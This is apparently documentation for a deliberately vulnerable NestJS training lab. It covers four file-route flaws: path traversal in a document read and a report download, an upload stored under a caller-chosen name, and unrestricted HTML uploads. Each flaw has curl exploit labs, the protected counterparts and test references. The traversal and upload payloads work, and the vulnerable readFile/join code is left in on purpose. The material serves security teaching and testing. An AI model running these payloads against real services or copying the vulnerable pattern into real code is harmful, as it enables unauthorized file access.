# `FS` — files

Four weaknesses of file routes that trust a name. Three are the old console's document routes of `accounts`: a route serves by the caller's name, which `..` turns into a climb out of everything the service owns (`FS-001`); an upload is stored under the destination name the caller sends (`FS-002`); and any extension and any content type is accepted, HTML included (`FS-003`). The fourth is a report download of `trading` that joins the caller's name to its directory and reads wherever the path lands (`FS-004`). The protected counterparts are in `apps/accounts/src/documents/documents.controller.ts` and `apps/trading/src/reports/reports.controller.ts`: a name comes from a stored record, or is resolved and checked to stay inside its directory, and an upload is stored under a generated name with an allowlisted extension.

The `accounts` reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults); the launcher runs the services from the repository root, so a name with no `..` already reaches the repository. The `trading` one was run on 2026-11-27 against the service alone on `127.0.0.1:4202`, through its HTTP/1.1 relay on `127.0.0.1:4212`. Each counterpart's claim is scoped: this route, receiving the identical input, keeps the file where it belongs for the reason given. Nothing here says any file route is secure in general.

<a id="fs-001"></a>
## FS-001 — the file name is the path

<a id="fs-001-agent"></a>
### FS-001 — agent reference

| | |
| --- | --- |
| Operation | REST `GET /internal/documents/file/:name` |
| Sink | The caller's name resolved against the directory the service runs in, in `apps/accounts/src/legacy/legacy-documents.controller.ts` |
| Flow | `..%2F..%2Fpackage.json` → `readFile(resolve(name))` → any file the process can read |
| Counterparts | `apps/accounts/src/documents/documents.controller.ts` (`:id/view`: the stored name comes from the record; `by-name/:name`: the stored path is resolved and checked against the directory) |
| Tests | `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts` |
| Expected finding | Yes, CWE-22, SAST |

<a id="fs-001-student"></a>
### FS-001 — student guide

A route that serves by name trusts the name to stay inside. `resolve` turns `..` into a climb, and the process can read far more than its own documents: the repository it runs from included.

<a id="fs-001-exploit"></a>
### FS-001 — exploit lab

From the repository root (the start command's own working directory):

```console
$ curl -s $RELAY/internal/documents/file/package.json -H "authorization: Bearer $ALICE" | jq .name
"vuln-nestjs"
```

The repository's manifest, read through a document route. From a test, whose service runs in `apps/accounts`, the same climb is spelled:

```console
$ curl -s $RELAY/internal/documents/file/..%2F..%2Fpackage.json -H "authorization: Bearer $ALICE" | jq .name
"vuln-nestjs"
```

The same traversal against the counterparts:

```console
$ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/documents/by-name/..%2F..%2Fpackage.json -H "authorization: Bearer $ALICE"
404
$ curl -s -i $RELAY/internal/documents/d-alice-avatar/view -H "authorization: Bearer $ALICE" | grep -i 'content-disposition\|x-content-type'
content-disposition: attachment
x-content-type-options: nosniff
```

No document carries that name, and the bytes of one that did would be read from the path the record names, checked to stay inside.

<a id="fs-001-safe"></a>
### FS-001 — vulnerable and protected

| | Why |
| --- | --- |
| `file/:name` (vulnerable) | The name is resolved against the process's own directory, so `..` climbs out of everything the service owns |
| `:id/view` (protected) | The name comes from the database record, never from the caller |
| `by-name/:name` (protected) | The stored path is resolved and checked against the documents directory before anything is read |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the name `..%2F..%2Fpackage.json` that climbs out of the service's directory on the file route answers 404 on the by-name route, whose stored path is resolved and checked against the documents directory before anything is read, and is no name at all on the id route, which serves the file its record names, as an attachment. The claim is not that the check defeats every encoding of a climb; only that this name reads no manifest through them.

<a id="fs-001-tests"></a>
### FS-001 — tests

`apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts`, `FS-001`: `..%2F..%2Fpackage.json` answers the repository manifest; the id route serves the seeded PNG as an attachment; the by-name route answers 404 for the traversal.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries two requests: `FS-001: the file name is the path` and `FS-001: the by-name counterpart refuses the climb`.

<a id="fs-002"></a>
## FS-002 — the upload is stored under its own name

<a id="fs-002-agent"></a>
### FS-002 — agent reference

| | |
| --- | --- |
| Operation | REST `POST /internal/documents/legacy` |
| Sink | The caller's destination name joined to the documents directory unchecked, in `apps/accounts/src/legacy/legacy-documents.controller.ts` |
| Flow | `?name=../outside-zazzles.txt` → `write(documents/../outside-zazzles.txt)` → the write lands outside the upload directory |
| Counterparts | `apps/accounts/src/documents/documents.controller.ts` (`POST /internal/documents`: a generated name; `checked`: the same, behind the signature check) |
| Tests | `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts` |
| Expected finding | Yes, CWE-22, SAST |

<a id="fs-002-student"></a>
### FS-002 — student guide

The console's uploader named the destination file itself, and the service believed the name. (The multipart layer strips paths from the file's own name, which is why the old console sent the destination as the request's `name` field.) Joined unchecked, `..` writes a directory up from the uploads.

<a id="fs-002-exploit"></a>
### FS-002 — exploit lab

```console
$ curl -s $RELAY 'internal/documents/legacy?name=..%2Fmarker.html' -H "authorization: Bearer $ALICE" \
    -F 'file=@marker.html;type=text/html'
{"id":"d-deded4c0-…","originalName":"../marker.html","mimeType":"text/html","size":56,…}
```

The answer names the destination as it was spelled; the file landed in the store's root, one directory above `documents`, where no upload belongs. The same upload through the safe route stores a generated name inside:

```console
$ curl -s $RELAY/internal/documents -H "authorization: Bearer $ALICE" -F 'file=@inside.txt;type=text/plain'
{"id":"…","originalName":"inside.txt","mimeType":"text/plain",…}
```

and the files on disk are `<uuid>.txt`, inside the documents directory, whatever the uploader's file was called.

<a id="fs-002-safe"></a>
### FS-002 — vulnerable and protected

| | Why |
| --- | --- |
| `legacy?name=…` (vulnerable) | The destination is the caller's, joined to the directory as spelled |
| `POST /internal/documents` (protected) | The stored name is a fresh identifier with an allowlisted extension; the uploader's name is data |
| `POST /internal/documents/checked` (protected) | The same generated name, after the extension, size and signature checks |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the destination name `../marker.html` that lands the upload one directory above `documents` on the legacy route is not read on either safe route, which store the file under a generated name inside the directory, whatever the uploader called it. The claim is not that a generated name makes every upload harmless; only that this name decides no path through them.

<a id="fs-002-tests"></a>
### FS-002 — tests

`apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts`, `FS-002`: the legacy upload writes `outside-zazzles.txt` in the store's root and not in `documents`; both safe routes store uuid-named files inside and nothing outside.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `FS-002: the upload is stored under its own name`.

<a id="fs-003"></a>
## FS-003 — any type accepted, HTML included

<a id="fs-003-agent"></a>
### FS-003 — agent reference

| | |
| --- | --- |
| Operation | REST `POST /internal/documents/legacy` |
| Sink | No check on extension or content type: the upload's content type is stored as given, in `apps/accounts/src/legacy/legacy-documents.controller.ts` |
| Flow | an `.html` part arrives as `text/html` → both are stored as the uploader's word |
| Counterparts | `apps/accounts/src/documents/documents.controller.ts` (`POST /internal/documents`: extension and size allowlist; `checked`: plus the file signature) |
| Tests | `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts` |
| Expected finding | Yes, CWE-434, SAST |

<a id="fs-003-student"></a>
### FS-003 — student guide

An upload route that accepts whatever it is handed becomes the storage of whatever the next weakness needs. HTML and SVG are script carriers; the safe routes allowlist four extensions, and the checked route also makes the bytes prove their extension.

<a id="fs-003-exploit"></a>
### FS-003 — exploit lab

```console
$ curl -s $RELAY/internal/documents/legacy -H "authorization: Bearer $ALICE" \
    -F 'file=@marker.html;type=text/html'
{"id":"…","originalName":"marker.html","mimeType":"text/html","size":56,…}
```

Accepted, `text/html` and all (this upload is XSS-002's payload). The same part through the counterparts:

```console
$ curl -s $RELAY/internal/documents -H "authorization: Bearer $ALICE" -F 'file=@marker.html;type=text/html'
{"message":"A document ends in .png, .jpg, .pdf, .txt", …}          # 400
$ curl -s $RELAY/internal/documents/checked -H "authorization: Bearer $ALICE" \
    -F 'file=@marker.png;type=image/png'                            # HTML bytes
{"message":"The file does not start with the signature its extension claims", …}  # 400
```

<a id="fs-003-safe"></a>
### FS-003 — vulnerable and protected

| | Why |
| --- | --- |
| `legacy` (vulnerable) | Extension and content type are the uploader's word, stored as given |
| `POST /internal/documents` (protected) | The extension allowlist is png, jpg, pdf, txt, and the size is capped |
| `checked` (protected) | The same, plus the file's first bytes must match the signature the extension claims |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the `marker.html` part sent as `text/html` is refused by the safe route, whose extension allowlist has no `.html`, and the checked route also refuses a file whose first bytes do not match the signature its extension claims. The claim is not that four extensions and a signature check make every upload harmless; only that this part is stored through neither.

<a id="fs-003-tests"></a>
### FS-003 — tests

`apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts`, `FS-003`: the legacy route accepts the HTML upload with its content type; the safe route refuses the extension; the checked route also refuses a lying signature.

The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries two requests: `FS-003: any type accepted, HTML included` and `FS-003: the safe upload refuses the extension`.

<a id="fs-004"></a>
## FS-004 — path traversal in a report download

<a id="fs-004-agent"></a>
### FS-004 — agent reference

- **Service:** `trading`.
- **Source:** `apps/trading/src/reports/reports-files.controller.ts`
- **Operation:** `GET /internal/reports/files/:name`, REST, a signed-in user.
- **Sink:** `readFile(join(REPORTS_DIRECTORY, name))`: the name is joined to the directory as it came, and nothing checks where the path lands.
- **Flow:** the `:name` parameter → `join(REPORTS_DIRECTORY, name)` → `readFile`: `..%2F..%2Fpackage.json` reads the service's own manifest.
- **Counterparts:** `apps/trading/src/reports/reports.controller.ts`: `GET /internal/reports/:id` (the file's name comes from the database row, never from the caller), `GET /internal/reports/file/:name` (the name is resolved under the directory and checked to stay inside it).
- **Tests:** `apps/trading/test/scenarios/exports.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report a caller's path joined to a directory and read with no check of where it lands: CWE-22.

<a id="fs-004-student"></a>
### FS-004 — student guide

A download route takes a file name from the caller and joins it to a directory. Nothing checks where the joined path lands, so a name that climbs out of the directory reads any file the service's own user can read. Here, the harmless marker this scenario proves itself with is the application's own manifest.

The line (`apps/trading/src/reports/reports-files.controller.ts`):

```ts
// FS-004 / CWE-22: the name is joined to the directory as it came, and nothing checks where the path lands
const contents = await readFile(join(REPORTS_DIRECTORY, name));
```

<a id="fs-004-exploit"></a>
### FS-004 — exploit lab

The reproduction was run on 2026-11-27 against the service alone, on `127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is Alice's token. The report files of a run are written under `trading`'s own directory, at `REPORTS_DIRECTORY` (`apps/trading/src/reports/reports.service.ts`), which a run creates when an export is asked for and the lab's reset removes.

```console
$ curl -s $URL/internal/reports/files/..%2F..%2Fpackage.json -H "authorization: Bearer $A"
{
  "name": "@zazzles/exchange-trading",
  "version": "0.0.0",
  "description": "Markets, prices, wallets, orders, trades and reports of VCX",
  "private": true,
  "license": "MIT",
  "type": "module",
  ...
```

Two directories above the reports directory sits this service's `package.json`: read on a user's token. What was gained is a file outside the export directory, reached by nothing more than a name.

The same name through the counterparts. `GET /internal/reports/:id`: the file's name comes from the database row, never from the caller, so there is no name to climb with.

```console
$ curl -s $URL/internal/reports/1 -H "authorization: Bearer $A"
{"report":{"id":"1","userId":"u-alice","kind":"statement","storedName":"statement-u-alice.csv",
 "createdAt":"2026-01-01T00:00:00.000Z"}}
```

An id nothing stores answers `NOT_FOUND`.

`GET /internal/reports/file/:name`: the name is resolved under the directory and checked to stay inside it.

```console
$ curl -s $URL/internal/reports/file/..%2F..%2Fpackage.json -H "authorization: Bearer $A"
{"message":"A report is read under its own directory","error":"Forbidden","statusCode":403}
```

`FORBIDDEN`, before anything is read. A caller's own stored name downloads normally; another user's stored name answers `NOT_FOUND`.

<a id="fs-004-safe"></a>
### FS-004 — vulnerable and protected

| | Operation | What it does with the same name |
| --- | --- | --- |
| Vulnerable | `GET /internal/reports/files/:name` | Joins the caller's name to the directory and reads it, wherever the path lands |
| Counterpart 1 | `GET /internal/reports/:id` | Reads the file whose name the database row stores; the caller names no path |
| Counterpart 2 | `GET /internal/reports/file/:name` | Resolves the name under the directory and refuses a path that leaves it, before anything is read: 403 |

**Scoped claim.** Each counterpart defeats this flaw for identical input: the name `..%2F..%2Fpackage.json` that reads the service's manifest through the files route reaches no file through the id route, which has no name to use, and is refused with 403 by the file route, which checks where the path lands. The claim is not that the check covers every encoding of a climb, or every file route of the service; only that this name reads nothing outside the directory through them.

<a id="fs-004-tests"></a>
### FS-004 — tests

`apps/trading/test/scenarios/exports.int-spec.ts`, describe `FS-004 — reports/files/:name joins the name to the directory`. One payload, sent to the traversal route and to both counterparts:

- **The exploit:** the traversal reads this service's own manifest.
- **Counterpart 1:** the by-id counterpart: the name comes from the database row, and an id nothing stores is 404.
- **Counterpart 2:** the file counterpart refuses the traversal: `FORBIDDEN`, outside the directory.

The collection `postman/trading/vuln-nestjs.trading.postman_collection.json` carries the request `FS-004 the traversal reads this service’s manifest`.
